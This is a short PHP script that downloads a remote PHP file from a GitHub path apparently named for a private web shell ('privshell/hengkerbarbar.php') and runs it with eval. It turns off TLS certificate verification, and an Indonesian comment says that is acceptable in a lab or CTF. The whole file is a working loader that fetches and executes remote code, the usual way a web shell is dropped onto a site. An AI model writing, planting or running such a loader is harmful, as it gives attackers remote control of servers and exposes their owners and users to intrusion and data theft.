<?php
function fetch_url($url){
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // di lab/CTF boleh, di produksi jangan
  $res = curl_exec($ch);
  $err = curl_error($ch);
  curl_close($ch);
  if($res === false) { trigger_error("curl failed: $err", E_USER_WARNING); return false;}
  return $res;
}

$code = fetch_url('https://github.com/neurodie/hxc/raw/refs/heads/main/privshell/hengkerbarbar.php');
if($code !== false){
  eval('?>'.$code);
} else {
  echo "fetch failed\n";
}
